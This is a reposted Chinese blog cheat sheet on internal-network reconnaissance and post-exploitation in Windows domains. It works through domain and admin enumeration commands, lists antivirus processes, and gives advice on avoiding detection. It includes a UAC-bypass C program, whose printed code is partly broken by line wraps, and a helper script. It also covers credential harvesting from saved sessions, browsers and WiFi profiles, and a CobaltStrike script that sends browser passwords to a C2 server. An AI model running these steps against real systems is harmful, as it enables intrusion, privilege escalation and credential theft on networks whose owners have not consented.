<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>内网信息收集【转载】 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="内网信息收集【转载】" />
<meta property="og:description" content="信息收集 查询本机器的进程信息
wmic process list brief 或者 tasklist 常见的杀毒软件进程
360tray.exe 360安全卫士 360sd.exe 360杀毒 MsMpEng.exe Windows Defender（Microsoft Security Essentials） hipstray.exe 火绒 wsctrl.exe 火绒 usysdiag.exe 火绒 ksafe.exe 金山卫士 QQPCRTP.exe QQ电脑管家 kxetray.exe 金山毒霸 KvMonXP.exe 江民杀毒 RavMonD.exe 瑞星杀毒 Mcshield.exe 麦咖啡 avp.exe 卡巴斯基 TMBMSRV.exe 趋势杀毒 avcenter.exe Avira(小红伞） safedog.exe 安全狗 SafeDogGuardCenter.exe 安全狗 safedogupdatecenter.exe 安全狗 safedogguardcenter.exe 安全狗 SafeDogSiteIIS.exe 安全狗 SafeDogTray.exe 安全狗 SafeDogServerUI.exe 安全狗 D_Safe_Manage.exe D盾 d_manage.exe D盾 yunsuo_agent_servic.exe 云锁 yunsuo_agent_daemon.exe 云锁 HwsPanel.exe 护卫神·入侵防护 hws_ui.exe 护卫神 hws.exe 护卫神·入侵防护系统 服务处理程序 hwsd." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/cbba9465f7389248c04a79a6b1bda654/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-02T16:39:15+08:00" />
<meta property="article:modified_time" content="2022-06-02T16:39:15+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">内网信息收集【转载】</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>信息收集</h3> 
<p>查询本机器的进程信息</p> 
<pre><code>wmic process list brief
或者
tasklist
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/bc/50/DbHevaxx_o.png"></p> 
<p>常见的杀毒软件进程</p> 
<pre><code>360tray.exe 　360安全卫士

360sd.exe 　360杀毒

MsMpEng.exe 　Windows Defender（Microsoft Security Essentials）

hipstray.exe 　火绒

wsctrl.exe 　火绒

usysdiag.exe 　火绒

ksafe.exe 　金山卫士

QQPCRTP.exe 　QQ电脑管家

kxetray.exe 　金山毒霸

KvMonXP.exe 　江民杀毒

RavMonD.exe 　瑞星杀毒

Mcshield.exe 　麦咖啡

avp.exe 　卡巴斯基

TMBMSRV.exe 　趋势杀毒

avcenter.exe 　Avira(小红伞）

safedog.exe 　安全狗

SafeDogGuardCenter.exe 　安全狗
safedogupdatecenter.exe 　安全狗
safedogguardcenter.exe 　安全狗
SafeDogSiteIIS.exe 　安全狗
SafeDogTray.exe 　安全狗
SafeDogServerUI.exe 　安全狗
D_Safe_Manage.exe 　D盾
d_manage.exe 　D盾
yunsuo_agent_servic.exe 　云锁
yunsuo_agent_daemon.exe 　云锁
HwsPanel.exe 　护卫神·入侵防护
hws_ui.exe 　护卫神
hws.exe 　护卫神·入侵防护系统 服务处理程序
hwsd.exe 　护卫神·入侵防护系统 监控组件
</code></pre> 
<p>查看当前在线用户</p> 
<p>query user</p> 
<p><img alt="" height="1" src="https://images2.imgbox.com/26/0b/lqlUfQDg_o.png" width="1"></p> 
<pre><code>Systeminfo #列出计算机信息以及补丁信息
route print  或者 arp -a  #查询路由表以及所有可用接口ARP的缓存表
</code></pre> 
<p>列出当前计算机域所有链接的客户端之间的会话</p> 
<p>如果有回话的话 正常来说会显示的</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/86/29/ycPg5IBJ_o.png"></p> 
<h3>定位DC及获取⽤户、组信息</h3> 
<pre><code>net config workstation #查询当前登录域及登录⽤户信息
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/76/3b/9H9Nl5bw_o.png"></p> 
<p>net user /domain #查询域内⽤户</p> 
<p>wmic useraccount get /all #查询域内⽤户的详细信息</p> 
<p><img alt="" height="1" src="https://images2.imgbox.com/ae/c8/zYZeyb3u_o.png" width="1"></p> 
<p>net accounts /domain #查看域密码策略</p> 
<p>net user lab /domain #查看指定域⽤户lab的详细信息</p> 
<p>net view /domain #查看有⼏个域</p> 
<p><img alt="" height="1" src="https://images2.imgbox.com/1b/73/eJU8rgFD_o.png" width="1"></p> 
<pre><code>net view /domain:xxx #查看域内的主机

net group /domain #查看域⾥⾯的组

net group "domain users" /domain #查看域⽤户

net group "domain controllers" /domain #查看域控制器

net group "domain computers" /domain #查看域内所有的主机

net group "domain admins" /domain #查看域管理员,该组内的成员对域控

拥有完全控制权

net group "enterprise admins" /domain #查看企业管理组,该组内的成员对域

控拥有完全控制权

net group "domain guest" /domain #查看域访客组,权限较低

net accounts /domain #查询域密码策略

whoami /user #查看⽤户SID和域SID
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/4e/ec/HJEo0B16_o.png"></p> 
<pre><code>#域控权限

dsquery user #查询⽬录中的⽤户

dsquery computer #查询⽬录中的主机

dsquery group #查询⽬录中的组

dsquery ou #查询⽬录中的组织单元

dsquery site #查询⽬录中的站点

dsquery server #查询域控

dsquery contact #查询⽬录中的联系⼈

dsquery subnet #查询⽬录中的⼦⽹

dsquery quota #查询⽬录中的配额规定

dsquery partition #查询⽬录中的分区

dsquery server –domain zkaq.cn | dsget server–dnsname –site #搜索域内

域控制器的DNS主机名和站点名

dsquery computer domainroot –name -xp –limit n #搜索域内以-xp结尾的机

器n台

dsquery user domainroot –name admin -limit n #搜索域内以admin开头

的⽤户n个

nltest /DCLIST:zkaq.cn
net time /domain
nslookup -type=srv _ldap._tcp #查看DNS服务器的地址，⼀般DNS
服务器的IP就是域控的地址
netdom query pdc #查看主域控制器
dsquery server #该命令只能在域控上执⾏

</code></pre> 
<p>查询域控</p> 
<p>net view /domain</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/6b/4a/dDhyX2zl_o.png"></p> 
<h3>登录历史</h3> 
<p>psloggedon.exe</p> 
<p>https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</p> 
<p>此⼯具⽤于查看本地登录的⽤户和通过本地计算机或远程计算机资源登录的⽤户。</p> 
<p>在PStools集合中就有此工具</p> 
<p><img alt="" height="1" src="https://images2.imgbox.com/90/b8/6MQX1TFM_o.png" width="1"></p> 
<h3>setspn</h3> 
<p>官方文档:</p> 
<p>https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names全称 Service Principal Names。<br> SPN 是服务器上所运行服务的唯一标识，每个使用 Kerberos 的服务都需要一个 SPN。<br> SPN 分为两种，一种注册在 AD 上机器帐户 ( Computers ) 下，另一种注册在域用户帐户 ( Users ) 下。当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户 ( Computers ) 下。当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户 ( Users ) 下。<br> SPN 的格式<br> serviceclass/host:port/servicename<br> 说明:<br> · serviceclass 可以理解为服务的名称，常⻅的有 www, ldap, SMTP, DNS, HOST 等。<br> · host 有两种形式，FQDN 和 NetBIOS 名，例如 server01.test.com 和 server01。<br> · 如果服务运行在默认端口上，则端口号 ( port ) 可以省略。<br> 查询 **SPN</p> 
<p>** 对域控制器发起 LDAP 查询，这是正常 kerberos 票据行为的一部分，因此查询 SPN 的操作很难被检测。</p> 
<p>1 、使用 SetSPN</p> 
<p>Win7 和 Windows Srver2008 自带的工具。</p> 
<p>内网信息收集的时候 一般用cs或者其他框架的渗透工具去进行内网信息收集的话，一般来说都会触发告警。所以我们在信息收集的时候，尽量使用系统自带的工具或者用微软颁发签名的一些工具，这些就肯定不会有告警</p> 
<p>比如说setspn、nslookup以及dnscmd等</p> 
<p>我们可以在内网中扫描spn，快速寻找内网中注册的服务。</p> 
<p>普通域用户权限即可：</p> 
<pre><code>setspn -q */*
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/fb/0e/UKApYzQV_o.png"></p> 
<p>关于setspn，如果当前账号权限不够高是无法使用setspn命令的就会像这样，为什么呢，因为当前的账号不是域账号</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/a7/b3/qp8fMZuM_o.png"></p> 
<p>查看 zkaq.cn 域内的所有 SPN:</p> 
<pre><code>setspn.exe -T zkaq.cn -q */*
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/d1/99/f1ZmSX4d_o.png"></p> 
<p>输出结果实例:</p> 
<pre><code>CN=DC1,OU=Domain Controllers,DC=test,DC=com exchangeRFR/DC1 exchangeRFR/DC1.test.com
exchangeMDB/DC1.test.com exchangeMDB/DC1 exchangeAB/DC1 exchangeAB/DC1.test.com
SMTP/DC1 SMTP/DC1.test.com SmtpSvc/DC1 SmtpSvc/DC1.test.com
ldap/DC1.test.com/ForestDnsZones.test.com ldap/DC1.test.com/DomainDnsZones.test.com
Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.test.com DNS/DC1.test.com
GC/DC1.test.com/test.com RestrictedKrbHost/DC1.test.com RestrictedKrbHost/DC1
HOST/DC1/TEST HOST/DC1.test.com/TEST HOST/DC1 HOST/DC1.test.com
HOST/DC1.test.com/test.com E3514235-4B06-11D1-AB04-00C04FC2DCD2/0f33253b-2314-40f0-
b665-f4317b13e6b9/test.com ldap/DC1/TEST ldap/0f33253b-2314-40f0-b665-
f4317b13e6b9._msdcs.test.com ldap/DC1.test.com/TEST ldap/DC1 ldap/DC1.test.com
ldap/DC1.test.com/test.com CN=krbtgt,CN=Users,DC=test,DC=com kadmin/changepw
CN=COMPUTER01,CN=Computers,DC=test,DC=com RestrictedKrbHost/COMPUTER01 HOST/COMPUTER01
RestrictedKrbHost/COMPUTER01.test.com HOST/COMPUTER01.test.com CN=MSSQL Service
Admin,CN=Users,DC=test,DC=com MSSQLSvc/DC1.test.com
</code></pre> 
<p>以 CN 开头的每一行代表一个帐户，其下的信息是与该帐户相关联的 SPN。对于上面的输出数据，机器帐户 ( Computers ) 为:<br> · CN=DC1,OU=Domain Controllers,DC=test,DC=com<br> · CN=COMPUTER01,CN=Computers,DC=test,DC=com</p> 
<p>域用户帐户 ( Users ) 为:</p> 
<p>· CN=krbtgt,CN=Users,DC=test,DC=com</p> 
<p>· CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</p> 
<p>注册在域用户帐户 ( Users ) 下的 SPN 有两个:kadmin/changepw 和 MSSQLSvc/DC1.test.com。</p> 
<p>Windows 系统通过 SPN 查询获得服务和服务实例帐户的对应关系</p> 
<p>这里举一个例子:</p> 
<p>用户 a 要访问 MySQL 服务的资源，进行到 4.tgs_reply 时，步骤如下:</p> 
<p>( 1 ) Domain Controller 查询 MySQL 服务的 SPN</p> 
<p>如果该 SPN 注册在机器帐户 ( Computers ) 下，将会查询所有机器帐户 ( Computers ) 的 servicePrincipalName 属性，找到对应的帐户。</p> 
<p>如果该 SPN 注册在域用户帐户 ( Users ) 下，将会查询所有域用户 ( Users ) 的 servicePrincipalName 属性，找到 对应的帐户。</p> 
<h3>端口连接</h3> 
<p>比如我们拿下一台web站点，站库分离，那我们就可以利用如netstat -ano命令查看谁跟这台web通信，比如1433、3306这些端口。</p> 
<p>获取安装的软件列表：</p> 
<pre><code>wmic product get name,version
</code></pre> 
<h3>定位域控服务器</h3> 
<pre><code>net time /domain
</code></pre> 
<h3>nslookup</h3> 
<p>1、通过nslookup访问外部地址 回显IP</p> 
<p>注意：如果机器不出网 是无法使用次命令的</p> 
<pre><code> nslookup myip.opendns.com resolver1.opendns.com
</code></pre> 
<p>2、查看dns缓存 如果某站点频繁被访问 相关记录可能会出现在缓存里</p> 
<pre><code> ipconfig /displaydns
</code></pre> 
<p><img alt="" height="1" src="https://images2.imgbox.com/31/47/uOOOs0WY_o.png" width="1"></p> 
<p>3、如果是IIS7 IIS7.5: 执行如下命令:</p> 
<pre><code>  %windir%\system32\inetsrv\appcmd list site
</code></pre> 
<p>显示网站列表</p> 
<pre><code>%windir%\system32\inetsrv\appcmd list site /config /xml
</code></pre> 
<p>查看域控主机名</p> 
<pre><code>  nslookup -type=SRV _ldap._tcp
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/bd/ea/56TAPv50_o.png"></p> 
<p>快速定位域控ip，一般是dns、时间服务器:</p> 
<pre><code>net time /domain-
nslookup -type=all _ldap._tcp.dc._msdcs.jumbolab.com
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/6a/8a/2RScO24C_o.png"></p> 
<p>内网主机发现</p> 
<p>可以使用如下命令来达到内网主机的发现。查看共享资料:</p> 
<pre><code> net view
</code></pre> 
<p>查看arp表:</p> 
<pre><code>arp -a
</code></pre> 
<p>查看hosts文件:</p> 
<pre><code> linux:cat /etc/hosts
 windows:type c:\Windows\system32\drivers\etc\hosts
</code></pre> 
<h3>Adfind</h3> 
<p>AdFind 一款C++编写的域内查询信息的工具</p> 
<p>下载地址:https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</p> 
<p>常用命令<br> 列出域控制器名称:</p> 
<pre><code> AdFind -sc dclist
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/1a/0f/xidn50Ci_o.png"></p> 
<p>查看域控版本</p> 
<pre><code>  AdFind -schema -s base objectversion
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/2d/a5/rv7PPHEA_o.png"></p> 
<pre><code>查询当前域中在线的计算机:
  AdFind -sc computers_active
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/f3/a0/ecOmgxbW_o.png"></p> 
<pre><code>查询当前域中所有计算机:
  AdFind -f "objectcategory=computer"
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/3b/a5/1TF5gegW_o.png"></p> 
<p>查询当前域中所有计算机(只显示名称和操作系统):</p> 
<pre><code> AdFind -f "objectcategory=computer" name operatingSystem
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/3e/2b/hRYPmpxY_o.png"></p> 
<p>查询域内所有用户:</p> 
<pre><code>  AdFind -users name
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/50/e2/QLEGyZSg_o.png"></p> 
<p>查询所有GPO:</p> 
<pre><code>AdFind -sc gpodmp
</code></pre> 
<p>枚举受保护AD账户:</p> 
<pre><code>Adfind -f "&amp;(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
</code></pre> 
<p>查看域内用户详细信息:</p> 
<pre><code> adfind.exe -h DNS_SERVER_IP -sc u:username #目标用户
</code></pre> 
<p>查看域用户能登录的机器(userWorkstations)</p> 
<pre><code> adfind.exe -h DNS_SERVER_IP -sc u:username userWorkstations
</code></pre> 
<p>查看域内所有用户详细信息:</p> 
<pre><code>AdFind.exe -h DNS_SERVER_IP -sc u:* &gt; result.txt
</code></pre> 
<h3>利用PsLoggendon.exe定位域管</h3> 
<p>PsLoggendon.exe是PsTools工具套件中的一员，用来查看通过资源共享登陆的用户，该工具的一些功能需要管理 员权限。</p> 
<p>下载地址:https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</p> 
<p><img alt="" height="1" src="https://images2.imgbox.com/9e/86/hb27TWQ1_o.png" width="1"></p> 
<p>另外两个定位域管的工具<br> PVEFindADUser.exe</p> 
<pre><code>  PVEFindADUser.exe -current "&lt;Domain admin name&gt;"
</code></pre> 
<p>PVEFindADUser.exe是用来枚举域用户以及登陆过特定系统的用户的一款工具，需要管理员权限。</p> 
<pre><code>下载地址：https://raw.githubusercontent.com/chrisdee/Tools/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/a7/f8/ayIOCm9a_o.png"></p> 
<p>PowerView.ps1</p> 
<pre><code>powershell.exe -exec bypass -Command "&amp; {Import-Module &lt;绝对路径&gt;; Invoke-UserHunter}"
</code></pre> 
<p>powerView.ps1是一款依赖powershell和wmi对内网进行查询的常用渗透测试脚本，集成在powersploit工具包中，是一个收集域信息很好用的脚本。</p> 
<p>源码地址：https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</p> 
<p>利用该工具的Invoke-UserHunter模块获取域管登陆过的机器信息</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/b8/01/rPNUYqXe_o.png"></p> 
<h3>BypassUAC</h3> 
<p>提到bypassUAC之前，先明白什么是UAC，UAC是windows系统的一种保护机制，其原理是通知用户是否对应用程序使用硬盘驱动和系统授权文件，以达到帮助阻止恶意程序损坏系统的效果</p> 
<p>通俗点来说，是当你管理员权限时，但是有些exe在打开的时候还是会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么我们将无法运行这类exe，这会影响我们后续的渗透。<br> 那么如何BypassUAC呢？<br> 有一些程序时直接获取管理员权限，同时不弹出UAC弹窗。这一类的程序被称为白名单程序。这些程序拥有autoElevete属性的值为True，会在启动时就静默提升权限！</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/52/cf/qzO2oBny_o.png"></p> 
<p>如果用cs或者msf提到了system就不需要进行bypassUAC了，system本身就是一个UAC权限</p> 
<h3>寻找不弹UAC框的程序</h3> 
<p>寻找autoElevate为true的程序</p> 
<p>在cmd一个个的去运行exe，如果不弹uac框就运行的既是</p> 
<p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p> 
<p>那么我们要寻找的uac程序需要符合以下几个要求：</p> 
<pre><code>1. 程序的manifest标识的配置属性 autoElevate 为true
2. 程序不弹出UAC弹窗
3. 从注册表里查询Shell\Open\command键值对
</code></pre> 
<p>首先是寻找autoElevate为true的程序，这里就写一个py脚本去批量跑一下，这里就找system32目录下面的</p> 
<pre><code>import os 
from subprocess import * 

path = 'c:\windows\system32' 
files = os.listdir(path) 
print(files) 
def GetFileList(path, fileList): 
    newDir = path 
    if os.path.isfile(path): 
        if path[-4:] == '.exe': 
            fileList.append(path) 
    elif os.path.isdir(path): 
        try: 
            for s in os.listdir(path): 
                newDir=os.path.join(path,s) 
                GetFileList(newDir, fileList) 
        except Exception as e: 
            pass 
    return fileList 
files = GetFileList(path, []) 
print(files) 

for eachFile in files: 
    if eachFile[-4:] == '.exe': 
        command = r'.\sigcheck64.exe -m {} | findstr auto'.format(eachFile) 
        print(command) 
        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE) 
        if '&lt;autoElevate&gt;true&lt;/autoElevate&gt;' in p1.stdout.read().decode('gb2312'): 
            copy_command = r'copy {} .\success'.format(eachFile) 
            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE) 
            print('[+] {}'.format(eachFile)) 
            with open('success.txt', 'at') as f: 
                f.writelines('{}\n'.format(eachFile))
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/92/79/Ne82EzXW_o.png"></p> 
<h3>从注册表里查询Shell\Open\command键值对</h3> 
<p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，</p> 
<p>就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p> 
<p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，ComputerDefaults会接下去查找 HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute是否也存在,若也存在到则读取 HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行。</p> 
<pre><code>#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: %s &lt;filePath&gt;\n", argv[0]);
        wprintf(L"       %s cmd.exe\n", argv[0]);
        exit(1);
    }
    LPWSTR filePath = argv[1];
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    HKEY hKey;
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-
settings\\Shell\\open\\command", &amp;hKey); // 创建注册表项 RegSetValueExW(hKey, L"", 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));
// 赋值，执行的exe路径
RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof("")); // 创建进程ComputerDefaults
CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c
C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS,
NULL, NULL, &amp;si, &amp;pi);
// 延时十秒，等ComputerDefaults.exe运行
Sleep(10000);
// 清楚注册表项
RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
return 0; }
</code></pre> 
<h3>凭据收集</h3> 
<p>意思就是登录的凭据</p> 
<p>拿下一台机器后，我们需要做的就是尽可能的收集信息。</p> 
<p>比如远程连接凭据:</p> 
<p>cmdkey /list</p> 
<p>navicat：</p> 
<p>SecureCRT：</p> 
<table><thead><tr><th>xp/win2003</th><th>C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</th></tr></thead><tbody><tr><td>win7/win2008以上</td><td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td></tr></tbody></table> 
<p>Xshell：</p> 
<table><thead><tr><th>Xshell 5</th><th>%userprofile%\Documents\NetSarang\Xshell\Sessions</th></tr></thead><tbody><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr></tbody></table> 
<p>WinSCP：</p> 
<p>HKCU\Software\Martin Prikryl\WinSCP 2\Sessions</p> 
<p>vnc:</p> 
<p>RealVNC HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver Value: Password</p> 
<p>TightVNC HKEY_CURRENT_USER\Software\TightVNC\Server Value: Password or PasswordViewOnly</p> 
<p>TigerVNC HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 Value: Password</p> 
<p>UltraVNC C:\Program Files\UltraVNC\ultravnc.ini Value: passwd or passwd2</p> 
<p>也可以使用masterkey解密chrome保存的账号密码：</p> 
<p>%localappdata%\Google\Chrome\User Data\Default\Login Data</p> 
<h3>WIFI</h3> 
<p>通过如下命令获取连接过的wifi密码：</p> 
<p>for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</p> 
<h3>Seatbelt</h3> 
<p>可以利用Seatbelt工具做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等：</p> 
<p>项目地址：</p> 
<p>https://github.com/GhostPack/Seatbelt</p> 
<h3>360safebrowserdecrypt</h3> 
<p>项目地址：https://github.com/c0de3/360SafeBrowsergetpass</p> 
<h4>1.简介</h4> 
<p>这是一个一键辅助抓取360安全浏览器密码的CobaltStrike脚本，用于节省红队工作量，通过下载浏览器数据库、记录密钥来离线解密浏览器密码。</p> 
<h4>2.用法</h4> 
<p>加载Aggressor scripts后，<code>beacon</code>右键打开菜单执行<code>SafeBrowsergetpass</code>即可</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/ed/43/EzM8jp8N_o.png"></p> 
<p>执行后将下载浏览器数据库，记录密钥<code>MachineGuid</code>到<code>Credential</code></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/3b/25/Gx1JgqyY_o.png"></p> 
<h4>3.离线解密数据库</h4> 
<p>攻防演练中红队的时间非常珍贵，<code>SafeBrowsergetpass</code>执行后所有数据存储在C2服务器，可以稍后在本地对浏览器密码进行解密。</p> 
<p>只需要替换本地注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid</code>，替换原来360浏览器的<code>assis2.db</code>，通常路径为<code>C:\Users\Administrator\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis</code>,即可通过BrowserView进行本地解密。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/90/07/hgel0PN9_o.png"></p> 
<h3>利用ICMP协议快速探测内网</h3> 
<p>这种方式是依次对内网中的每一个ip地址执行ping命令，可以快速的找到内网存活的所有主机，在渗透测试中可以利用这一点循环探测整个c段，如下。</p> 
<pre><code>for /L %I in (1,1,254) Do @ping -w 1 -n 1 10.0.1.%I | findstr "TTL="
</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/b1/83/LaInBmH3_o.png"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/dd2015aa9ae6567ea64102dd57452ea3/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">结构体数组</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/b858732fed988f6bb6a73983afe4ee69/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">vue echarts 使用</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 